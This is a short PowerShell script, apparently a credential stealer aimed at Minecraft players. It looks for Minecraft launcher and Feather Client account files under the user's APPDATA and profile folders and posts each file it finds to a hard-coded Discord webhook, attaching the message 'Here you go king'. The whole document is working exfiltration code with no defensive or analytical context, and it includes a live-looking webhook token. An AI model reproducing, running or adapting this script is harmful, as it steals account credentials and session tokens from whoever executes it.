# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX"

# Possible account file locations for Minecraft and Feather Client
$possiblePaths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_profiles.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\FeatherClient\accounts.json",
    "$env:APPDATA\.feather\launcher_accounts.json",
    "$env:USERPROFILE\.feather\accounts.json"
)

$payload = '{"content":"Here you go king :pray:"}'

$foundAny = $false

foreach ($path in $possiblePaths) {
    if (Test-Path $path) {
        $foundAny = $true
        Write-Host "Found: $path - Sending..."
        $result = & curl.exe -s -X POST $webhookUrl -F "payload_json=$payload" -F "file=@$path"
        if ($LASTEXITCODE -eq 0) {
            Write-Host "SUCCESS: $path sent!"
        } else {
            Write-Host "FAILED: $result"
        }
    }
}

if (-not $foundAny) {
    Write-Host "No account files found."
    Write-Host "Searched paths:"
    foreach ($p in $possiblePaths) {
        Write-Host "  - $p"
    }
}

Write-Host ""
Write-Host "Done. Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
